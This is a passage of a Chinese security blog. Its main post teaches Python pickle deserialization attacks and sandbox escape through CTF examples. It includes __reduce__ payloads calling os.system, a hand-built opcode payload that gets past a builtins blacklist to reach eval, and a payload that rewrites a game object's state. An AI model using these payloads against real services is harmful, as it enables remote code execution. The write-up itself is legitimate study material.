<p>也就是fd,bk验证，看来我们得绕过去这一点才能有下面的利用，那么问题就来了，这时候我们根本不知道fd.bk这一栏需要写什么，因为这时候我们对内存地址一无所知，当然，如果我们知道，比如没有pie保护的程序中有地址储存了指针数组，那么我们就可以利用了。</p>
<p>so，我们需要进行一点变形，</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>off_by_one的leak是一样的</p>
<p>至于利用可以归到uaf中，实际情况实际分析吧。不想写了</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://ppcrab.github.io/2019/08/18/Python反序列化漏洞以及沙箱逃逸/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/photo/hello.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/08/18/Python反序列化漏洞以及沙箱逃逸/" itemprop="url">Python反序列化漏洞以及沙箱逃逸</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-08-18T22:40:58+08:00">
                2019-08-18
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Words count in article&#58;</span>
                
                <span title="Words count in article">
                  2.5k
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Reading time &asymp;</span>
                
                <span title="Reading time">
                  10
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>打2019Suctf的时候遇到了一个python反序列化漏洞的题目，学习了一波，由于没有接触过并且python水平确实不够，学习的很困难，没有搞出来。tcl.gg</p>
<p>不过学习还是要学习的</p>
<h3 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h3><h4 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h4><blockquote>
<p>当程序运行时，所有的变量或者对象都是存储到内存中的，一旦程序调用完成，这些变量或者对象所占有的内存都会被回收。而为了实现变量和对象持久化的存储到磁盘中或在网络上进行传输，我们需要将变量或者对象转化为二进制流的方式。 而将其转化为二进制流的过程就是序列化。</p>
</blockquote>
<p>我在刚看到这段定义的时候，并不是很理解，<strong>为了实现变量和对象持久化的存储到磁盘中或在网络上进行传输</strong>这句话。所以我去找了持久化和序列化的区别：</p>
<blockquote>
<p><a href="http://baike.baidu.com/view/2472114.htm" target="_blank" rel="noopener">持久</a><a href="http://baike.baidu.com/view/270175.htm" target="_blank" rel="noopener">化</a>（Persistence），即把<a href="http://baike.baidu.com/subview/38752/8058696.htm" target="_blank" rel="noopener">数据</a>（如内存中的对象）保存到可永久保存的存储设备中（如磁盘）。持久化的主要应用是将内存中的对象存储在关系型的数据库中，当然也可以存储在磁盘文件中、XML数据文件中等等。</p>
<p>持久化是将程序数据在持久状态和瞬时状态间转换的机制。</p>
<p>持久化是一种对象服务，就是把内存中的对象保存到外存中，让以后能够取回。需要实现至少3个接口：</p>
<p>void Save(object o) 把一个对象保存到外存中</p>
<p>Object Load(object oid) 通过对象标识从外存中取回对象</p>
<p>bool<a href="http://baike.baidu.com/view/1229931.htm" target="_blank" rel="noopener">Exists</a>(object oid) 检查外存中是否存在某个对象</p>
</blockquote>
<p>至于为什么需要持久化，这是由于内存的固有缺陷引起的，因为内存无法永久的储存数据，比如断电，进程退出。立马gg</p>
<blockquote>
<p>序列化也是一种对象服务，就是把内存中的对象序列化成<a href="https://www.zhihu.com/question/38075755" target="_blank" rel="noopener">流</a>、或者把流反序列化成对象。</p>
<p>序列化是为了解决对象的传输问题，传输可以在<a href="http://baike.baidu.com/view/1053.htm" target="_blank" rel="noopener">线程</a>之间、进程之间、内存外存之间、<a href="http://baike.baidu.com/view/23880.htm" target="_blank" rel="noopener">主机</a>之间进行。我之所以在这里提到序列化，是因为我们可以利用序列化来辅助持久化，可以说凡是可以持久化的对象都可以序列化，因为序列化相对容易一些（也不是很容易），所以主流的软件基础设施，比如.net和java，已经把序列化的框架完成了</p>
</blockquote>
<p>好了，最基础的东西明白了，继续</p>
<h4 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h4><p>而反序列化就是说程序运行的时候不能从磁盘中进行读取，需要将序列化的对象或者变量从磁盘中转移到内存中，同时也会将二进制流转换为原来的数据格式。我们把这一过程叫做反序列化。</p>
<p>可以看到这里的序列化和反序列化提到了网络传输，所以，如果这种传输方式有漏洞，那么利用这种漏洞就可以作为我们获得远程权限的方式。</p>
<h3 id="python的序列化反序列化模块pickle和json"><a href="#python的序列化反序列化模块pickle和json" class="headerlink" title="python的序列化反序列化模块pickle和json"></a>python的序列化反序列化模块pickle和json</h3><h4 id="pickle"><a href="#pickle" class="headerlink" title="pickle"></a>pickle</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line">dict1 = &#123;<span class="string">'a'</span>: <span class="number">1</span>, <span class="string">'b'</span>: <span class="number">2</span>&#125;</span><br><span class="line"></span><br><span class="line">dict2 = pickle.dumps(dict1)</span><br><span class="line"></span><br><span class="line">print(dict2,type(dict2),id(dict2))</span><br><span class="line"></span><br><span class="line">dict3 = pickle.loads(dict2)</span><br><span class="line"></span><br><span class="line">print(dict3,type(dict3),id(dict3))</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">b&apos;\x80\x03&#125;q\x00(X\x01\x00\x00\x00aq\x01K\x01X\x01\x00\x00\x00bq\x02K\x02u.&apos; &lt;class &apos;bytes&apos;&gt; 1798082169904</span><br><span class="line">&#123;&apos;a&apos;: 1, &apos;b&apos;: 2&#125; &lt;class &apos;dict&apos;&gt; 1798080970112</span><br></pre></td></tr></table></figure>
<p>从这个结果也可以进一步理解序列化与内存的关系，很明显，这两者在内存中的地址变了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line">dict1 = &#123;<span class="string">'a'</span>: <span class="number">1</span>, <span class="string">'b'</span>: <span class="number">2</span>&#125;</span><br><span class="line">file = open(<span class="string">'1.txt'</span>, <span class="string">'wb'</span>)</span><br><span class="line">dict2 = pickle.dump(dict1, file)</span><br><span class="line">file.close()</span><br><span class="line">print(dict2, type(dict2), id(dict2))</span><br><span class="line">file1 = open(<span class="string">'1.txt'</span>, <span class="string">'rb'</span>)</span><br><span class="line">dict3 = pickle.load(file1)</span><br><span class="line">file1.close()</span><br><span class="line">print(dict3, type(dict3), id(dict3))</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> None &lt;class &apos;NoneType&apos;&gt; 1665574096</span><br><span class="line">&#123;&apos;a&apos;: 1, &apos;b&apos;: 2&#125; &lt;class &apos;dict&apos;&gt; 2223480349680</span><br></pre></td></tr></table></figure>
<h4 id="json"><a href="#json" class="headerlink" title="json"></a>json</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">dict1 = &#123;<span class="string">'a'</span>: <span class="number">1</span>, <span class="string">'b'</span>: <span class="number">2</span>&#125;</span><br><span class="line">dict2 = json.dumps(dict1)</span><br><span class="line">print(dict2, type(dict2), id(dict2))</span><br><span class="line">dict3 = json.loads(dict2)</span><br><span class="line">print(dict3, type(dict3), id(dict3))</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;a&quot;: 1, &quot;b&quot;: 2&#125; &lt;class &apos;str&apos;&gt; 2165132891960</span><br><span class="line">&#123;&apos;a&apos;: 1, &apos;b&apos;: 2&#125; &lt;class &apos;dict&apos;&gt; 2165130960184</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">dict1 = &#123;<span class="string">'a'</span>: <span class="number">1</span>, <span class="string">'b'</span>: <span class="number">2</span>&#125;</span><br><span class="line">file1 = open(<span class="string">'1.txt'</span>, <span class="string">'w'</span>)</span><br><span class="line">dict2 = json.dump(dict1, file1)</span><br><span class="line">file1.close()</span><br><span class="line">print(dict2, type(dict2), id(dict2))</span><br><span class="line">file2 = open(<span class="string">'1.txt'</span>, <span class="string">'r'</span>)</span><br><span class="line">dict3 = json.load(file2)</span><br><span class="line">print(dict3, type(dict3), id(dict3))</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">None &lt;class &apos;NoneType&apos;&gt; 1665574096</span><br><span class="line">&#123;&apos;a&apos;: 1, &apos;b&apos;: 2&#125; &lt;class &apos;dict&apos;&gt; 2161938798992</span><br></pre></td></tr></table></figure>
<p>我要先搞一波pickle的漏洞</p>
<h3 id="python反序列化漏洞的原因"><a href="#python反序列化漏洞的原因" class="headerlink" title="python反序列化漏洞的原因"></a>python反序列化漏洞的原因</h3><p>序列化对象的时候，类中的自动执行的函数也会被序列化，并且在反序列化的时候，该函数(<strong> reduce </strong>)会直接被执行。</p>
<blockquote>
<p>When a tuple is returned, it must be between two and five items long. Optional items can either be omitted, or None can be provided as their value. The semantics of each item are in order:<br>A callable object that will be called to create the initial version of the object. A tuple of arguments for the callable object. An empty tuple must be given if the callable does not accept any argument. ……</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xuliehua</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> (os.system, (<span class="string">'echo "Hello,world"'</span>,))</span><br><span class="line">d = xuliehua()</span><br><span class="line">de = pickle.dumps(d)</span><br><span class="line">print(de)</span><br><span class="line">pickle.loads(de)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">b&apos;\x80\x03cnt\nsystem\nq\x00X\x08\x00\x00\x00echo &quot;H&quot;q\x01\x85q\x02Rq\x03.&apos;</span><br><span class="line">&quot;Hello,world&quot;</span><br></pre></td></tr></table></figure>
<p>也就是说，如果直接采用pickle.loads()去反序列化。结果是我们不能承受的，因为这里的命令我们可以随便填写的，相当于我们控制了对面的服务器，可还行？</p>
<h4 id="保护-限制"><a href="#保护-限制" class="headerlink" title="保护-限制"></a>保护-限制</h4><h5 id="example1"><a href="#example1" class="headerlink" title="example1"></a>example1</h5><p><a href="https://docs.python.org/3.7/library/pickle.html#pickle-restrict" target="_blank" rel="noopener">官方文档</a>给出了优化的例子</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> builtins</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">safe_builtins = &#123;</span><br><span class="line">    <span class="string">'range'</span>,</span><br><span class="line">    <span class="string">'complex'</span>,</span><br><span class="line">    <span class="string">'set'</span>,</span><br><span class="line">    <span class="string">'frozenset'</span>,</span><br><span class="line">    <span class="string">'slice'</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span><span class="params">(pickle.Unpickler)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span><span class="params">(self, module, name)</span>:</span></span><br><span class="line">        <span class="comment"># Only allow safe classes from builtins.</span></span><br><span class="line">        <span class="keyword">if</span> module == <span class="string">"builtins"</span> <span class="keyword">and</span> name <span class="keyword">in</span> safe_builtins:</span><br><span class="line">            <span class="keyword">return</span> getattr(builtins, name)</span><br><span class="line">        <span class="comment"># Forbid everything else.</span></span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">"global '%s.%s' is forbidden"</span> %</span><br><span class="line">                                     (module, name))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">restricted_loads</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="string">"""Helper function analogous to pickle.loads()."""</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br></pre></td></tr></table></figure>
<p>可以很清楚的看到，使用了中间类RestrictedUnpickler来反序列化，并加入白名单。只允许我们允许的类以及方法，这就有点东西了。</p>
<p>比如我们仍然将我们想要进行攻击的数据写成这样</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xuliehua</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> (os.system, (<span class="string">'echo "Hello,world"'</span>,))</span><br><span class="line">d = xuliehua()</span><br><span class="line">de = pickle.dumps(d)</span><br><span class="line">restricted_loads(de)</span><br></pre></td></tr></table></figure>
<p>得到的是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_pickle.UnpicklingError: global &apos;nt.system&apos; is forbidden</span><br></pre></td></tr></table></figure>
<p>也就是说我们成功的将条件限制在了<em>module == “builtins” and name in safe_builtins</em> </p>
<h5 id="example2"><a href="#example2" class="headerlink" title="example2"></a>example2</h5><p>然而，有一些限制有时候并不能阻止我们的攻击，比如hackergame2017的Hide and Seek题目中</p>
<p>限制条件为</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> module == <span class="string">"usingclass"</span> <span class="keyword">and</span> name == <span class="string">'file_contents'</span>:</span><br><span class="line">      <span class="keyword">return</span> file_contents</span><br><span class="line"><span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">"module='%s', name='%s' 是非法的"</span> % (module, name))</span><br></pre></td></tr></table></figure>
<p>我们可以看到，限制了我们的类名必须是usingclass，方法必须是file_contents</p>
<p>实际上，限制条件往往需要我们去试验，这种限制条件正常情况下怎么可能直接告诉你</p>
<p>so，此时我们只需要满足这个条件就可以了，十分简单</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">file_contents</span><span class="params">( filename , mode = <span class="string">'r'</span>)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"a"</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Credentials</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> (file_contents,(<span class="string">'flag.py'</span>,))</span><br><span class="line">apple = pickle.dumps(Credentials())</span><br><span class="line">print(apple)</span><br><span class="line">apple = apple.replace(<span class="string">b'__main__'</span>,<span class="string">b'usingname'</span>) </span><br><span class="line">orange = safe_unpickle(apple)</span><br><span class="line">print(orange)</span><br></pre></td></tr></table></figure>
<p>实际上，我们只是猜测了服务器端原有的usingclass模块含有的file_contents()函数的功能是读取文件内容。</p>
<p>而实际传输的序列化数据</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b&apos;\x80\x03cusingclass\nfile_contents\nq\x00X\x07\x00\x00\x00flag.pyq\x01\x85q\x02Rq\x03.&apos;</span><br></pre></td></tr></table></figure>
<p>仅仅是帮助满足了限制条件，顺便填充了栈，进而在return时调用file_content.(ps)</p>
<p> <img src="/2019/08/18/Python反序列化漏洞以及沙箱逃逸/1.PNG" alt="1"></p>
<p>所以说，这里并不是usingclass在调用file_contents模块，而是恰好语句构成的栈环境与下面的语句联系起来了。</p>
<p>当然，我们可以对我们的safeupickle进行一点改进</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> module == <span class="string">"usingclass"</span> <span class="keyword">and</span> name == <span class="string">'file_contents'</span>:</span><br><span class="line">       <span class="keyword">return</span> getattr(sys.modules[module], name)</span><br></pre></td></tr></table></figure>
<p>这就成了调用了~，nice</p>
<h5 id="example3"><a href="#example3" class="headerlink" title="example3"></a>example3</h5><p>关键的语句如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">blacklist = &#123;<span class="string">'eval'</span>, <span class="string">'exec'</span>, <span class="string">'execfile'</span>, <span class="string">'compile'</span>, <span class="string">'open'</span>, <span class="string">'input'</span>, <span class="string">'__import__'</span>, <span class="string">'exit'</span>&#125;</span><br><span class="line"><span class="string">"......................................"</span></span><br><span class="line"><span class="keyword">if</span> module == <span class="string">"builtins"</span> <span class="keyword">and</span> name <span class="keyword">not</span> <span class="keyword">in</span> blacklist:</span><br><span class="line">         <span class="keyword">return</span> getattr(builtins, name)</span><br></pre></td></tr></table></figure>
<p>我试图通过map绕过这个限制,重新调用exec()</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xuliehua</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> (map,((builtins.<span class="keyword">exec</span>[<span class="string">"__import__('os').system('dir')"</span>])))</span><br></pre></td></tr></table></figure>
<p>结果确实报错</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_pickle.UnpicklingError: global &apos;builtins.exec&apos; is forbidden</span><br></pre></td></tr></table></figure>
<p>并且我通过</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> module == <span class="string">"builtins"</span> <span class="keyword">and</span> name <span class="keyword">not</span> <span class="keyword">in</span> blacklist:</span><br><span class="line">      print(<span class="string">"right"</span>)</span><br><span class="line">      <span class="keyword">return</span> getattr(builtins, name)</span><br><span class="line"></span><br><span class="line"> <span class="keyword">else</span>:</span><br><span class="line">      print(<span class="string">"Error"</span>)</span><br></pre></td></tr></table></figure>
<p>的结果显示，明白了，反序列化的过程中，似乎这个检查没那么简单，并不是只检查一个外层模块就完事了。有点迷，看来需要学习新的知识了</p>
<h6 id="手搓payload-amp-pickle语言的学习"><a href="#手搓payload-amp-pickle语言的学习" class="headerlink" title="手搓payload &amp;pickle语言的学习"></a>手搓payload &amp;pickle语言的学习</h6><p><a href="https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html#pickle-code" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html#pickle-code</a></p>
<p> <img src="/2019/08/18/Python反序列化漏洞以及沙箱逃逸/6e3ef780-5535-4a7d-98c4-88edb18faf9f.864e0472fcb8.png" alt="6e3ef780-5535-4a7d-98c4-88edb18faf9f.864e0472fcb8"></p>
<p>以这个题目中给出的payload例子</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">de = <span class="string">b'''cbuiltins</span></span><br><span class="line"><span class="string">getattr</span></span><br><span class="line"><span class="string">(cbuiltins</span></span><br><span class="line"><span class="string">dict</span></span><br><span class="line"><span class="string">S'get'</span></span><br><span class="line"><span class="string">tR(cbuiltins</span></span><br><span class="line"><span class="string">globals</span></span><br><span class="line"><span class="string">(tRS'builtins'</span></span><br><span class="line"><span class="string">tRp1</span></span><br><span class="line"><span class="string">cbuiltins</span></span><br><span class="line"><span class="string">getattr</span></span><br><span class="line"><span class="string">(g1</span></span><br><span class="line"><span class="string">S'eval'</span></span><br><span class="line"><span class="string">tR(S'__import__("os").system("dir")'</span></span><br><span class="line"><span class="string">tR.'''</span></span><br><span class="line">print(de)</span><br><span class="line">restricted_loads(de)</span><br><span class="line"><span class="string">"我们稍加修改一下find_class函数中的一些语句"</span></span><br><span class="line"><span class="string">"......."</span></span><br><span class="line"> <span class="keyword">if</span> module == <span class="string">"builtins"</span> <span class="keyword">and</span> name <span class="keyword">not</span> <span class="keyword">in</span> blacklist:</span><br><span class="line">         print(module,<span class="string">"   "</span>,name)</span><br><span class="line">         <span class="keyword">return</span> getattr(builtins, name)</span><br></pre></td></tr></table></figure>
<p>结果如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">b&apos;cbuiltins\ngetattr\n(cbuiltins\ndict\nS\&apos;get\&apos;\ntR(cbuiltins\nglobals\n(tRS\&apos;builtins\&apos;\ntRp1\ncbuiltins\ngetattr\n(g1\nS\&apos;eval\&apos;\ntR(S\&apos;__import__(&quot;os&quot;).system(&quot;dir&quot;)\&apos;\ntR.&apos;</span><br><span class="line">rightbuiltins     getattr</span><br><span class="line">rightbuiltins     dict</span><br><span class="line">rightbuiltins     globals</span><br><span class="line">rightbuiltins     getattr</span><br></pre></td></tr></table></figure>
<p>对比我们的payload与debug的数据，不难发现，检查所限制的仅仅是通过<code>c</code>修饰的语句，这一点从表中也可以看出 </p>
<p>除此之外，我们还可以得到一些我们以后构造payload可能会用到的经验</p>
<p><code>S</code> 、 <code>V</code> ：翻译出来的语句的作用为，1.充当参数   2.模块下的函数引用</p>
<p>看起来和汇编shellcode差不多，熟能生巧，看得多了自然就会了，总之，限制稍微难一点的程序构造的payload都是需要我们进行手搓pickle的，gg</p>
<h5 id="example4"><a href="#example4" class="headerlink" title="example4"></a>example4</h5><p>Suctf2019 guess_game</p>
<p>这个题目我个小菜鸡觉得与前面的不同的是，他在运行代码的时候，目的是为了改变已有的game对象的值，以达到服务器端后续的检查绕过。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">exp = <span class="string">b'''cguess_game</span></span><br><span class="line"><span class="string">game</span></span><br><span class="line"><span class="string">&#125;S"win_count"</span></span><br><span class="line"><span class="string">I10</span></span><br><span class="line"><span class="string">sS"round_count"</span></span><br><span class="line"><span class="string">I9   #重新构造round_count与win_count中的数据</span></span><br><span class="line"><span class="string">sb'''</span><span class="comment">#更新game中的dict数据</span></span><br></pre></td></tr></table></figure>
<p><a href="https://github.com/rmb122/suctf2019_guess_game/tree/master/writeup" target="_blank" rel="noopener">https://github.com/ppcrab/suctf2019_guess_game</a></p>
<p>越到后面越觉得和shellcode 相像，只不过是另外的一个架构罢了。或许，底层的东西都很相似。</p>
<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="https://juejin.im/post/5be4e7b5e51d4535b07d1590" target="_blank" rel="noopener">https://juejin.im/post/5be4e7b5e51d4535b07d1590</a></p>
<p><a href="https://blog.csdn.net/shixiaoguo90/article/details/22433245" target="_blank" rel="noopener">https://blog.csdn.net/shixiaoguo90/article/details/22433245</a></p>
<p><a href="https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html</a></p>
<p><a href="https://github.com/rmb122/suctf2019_guess_game/tree/master/writeup" target="_blank" rel="noopener">https://github.com/rmb122/suctf2019_guess_game/tree/master/writeup</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://ppcrab.github.io/2019/08/09/以fastbin为基础的leak/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/photo/hello.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/08/09/以fastbin为基础的leak/" itemprop="url">以fastbin为基础的leak</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-08-09T07:55:17+08:00">
                2019-08-09
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Words count in article&#58;</span>
                
                <span title="Words count in article">
                  809
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Reading time &asymp;</span>
                
                <span title="Reading time">
